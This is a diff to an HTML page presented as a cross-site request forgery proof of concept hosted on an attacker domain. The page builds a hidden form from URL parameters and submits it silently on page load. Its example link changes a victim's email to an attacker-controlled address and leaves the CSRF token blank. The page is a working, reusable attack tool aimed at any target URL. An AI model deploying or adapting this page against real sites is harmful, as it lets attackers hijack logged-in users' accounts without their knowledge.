@@ -3,35 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dynamic CSRF Attack PoC - Attacker Origin</title>
+    <title>Dynamic CSRF Attack PoC - Attacker Origin (pipelock.dev)</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; }
-        .container { background-color: #ffffff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); }
-        h1 { color: #007bff; }
-        .note { margin-top: 20px; padding: 10px; background-color: #f0f8ff; border-left: 5px solid #0056b3; color: #004085; }
-        #status { font-weight: bold; margin-top: 15px; color: #333; }
+        body { font-family: Arial, sans-serif; margin: 20px; background-color: #1a1a1a; color: #eaeaea; }
+        .container { background-color: #2b2b2b; padding: 25px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4); }
+        h1 { color: #00CC66; border-bottom: 2px solid #00CC66; padding-bottom: 5px; }
+        .note { margin-top: 20px; padding: 10px; background-color: #3e3e3e; border-left: 5px solid #00CC66; color: #eaeaea; }
+        #status { font-weight: bold; margin-top: 15px; color: #00AEEF; }
+        #post-data { background-color: #3e3e3e; padding: 10px; border-radius: 4px; }
         /* Hide the form to make the attack "silent" for the victim */
         #csrfForm { display: none; } 
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Dynamic CSRF Proof of Concept (PoC)</h1>
-        <p><strong>Origin:</strong> This page is hosted on the attacker-controlled domain (your GitHub Pages).</p>
-        <p><strong>Goal:</strong> Force the victim's browser to execute a state-changing action on the target site using their session cookies.</p>
+        <h1>Cross-Site Request Forgery (CSRF) PoC</h1>
+        <p><strong>Origin:</strong> Hosted on <code>https://pipelock.dev</code> (Attacker Domain).</p>
 
         <div class="note">
-            <strong>Usage:</strong> All form data (target URL and POST parameters) are passed via URL query parameters, separated by an ampersand (&).
+            <strong>PoC URL Example:</strong> <code>https://pipelock.dev/csrf_attack.html?url=https://target.com/change-email&new_email=pwned@evil.com&csrf_token=</code>
             <br>
-            <strong>Example PoC URL:</strong> <code>https://yourusername.github.io/csrf_attack.html?url=https://target.com/change&action=email&value=pwned@evil.com</code>
+            (Note: Leaving `csrf_token` blank tests for missing or poorly implemented token checks.)
         </div>
 
         <h2>Attack Details</h2>
         <p><strong>Target URL:</strong> <code id="target-url-display">N/A</code></p>
+        <p><strong>POST Parameters to be Sent:</strong></p>
+        <pre id="post-data">No data yet.</pre>
+
         <p id="status">Status: Preparing attack payload...</p>
         
-        <form id="csrfForm" method="POST" action="">
-            </form>
+        <form id="csrfForm" method="POST" action=""></form>
 
         <script>
             function runCsrfAttack() {
@@ -39,6 +41,8 @@
                 const targetUrl = urlParams.get('url'); 
                 const form = document.getElementById('csrfForm');
                 const statusElement = document.getElementById('status');
+                const postDataElement = document.getElementById('post-data');
+                let postDataDisplay = '';
 
                 if (!targetUrl) {
                     statusElement.textContent = "ERROR: No target URL specified. Use the 'url' parameter.";
@@ -48,39 +52,36 @@
                 document.getElementById('target-url-display').textContent = targetUrl;
                 form.setAttribute('action', targetUrl);
                 
-                // --- 1. Iterate over all URL parameters to create hidden form inputs ---
                 let inputsAdded = 0;
                 for (const [key, value] of urlParams.entries()) {
-                    // Skip the 'url' key, as it's used for the form's action, not an input.
-                    if (key === 'url') {
-                        continue; 
-                    }
+                    if (key === 'url') { continue; } 
                     
-                    // Create a hidden input field for each key/value pair in the URL
                     const input = document.createElement('input');
                     input.type = 'hidden';
                     input.name = key;
                     input.value = value;
                     form.appendChild(input);
+                    
+                    postDataDisplay += `\n${key}: ${value}`;
                     inputsAdded++;
                 }
 
                 if (inputsAdded === 0) {
-                    statusElement.textContent = "WARNING: No POST data found. Add parameters like ?url=...&name=value...";
+                    postDataElement.textContent = "WARNING: No POST parameters were provided via the URL.";
+                    statusElement.textContent = "WARNING: No POST data found. Attack aborted.";
                     return;
                 }
                 
-                // --- 2. Execute the attack ---
+                postDataElement.textContent = postDataDisplay.trim();
+                
                 statusElement.textContent = `SUCCESS: Submitting CSRF form to ${targetUrl} with ${inputsAdded} parameters...`;
                 form.submit();
                 
-                // Note: We use setTimeout to ensure the status message is visible before the page finishes loading
                 setTimeout(() => {
-                    statusElement.textContent = "CSRF request sent. You must check the target site's server logs or user interface for confirmation of the successful state change (e.g., email changed, password updated, etc.).";
+                    statusElement.innerHTML = "<strong>CSRF request sent.</strong><br>Vulnerability confirmation relies on checking the target site's server logs or the victim's account state (e.g., password/email changed).";
                 }, 500);
             }
 
-            // Start the attack immediately on page load
             runCsrfAttack();
         </script>
     </div>
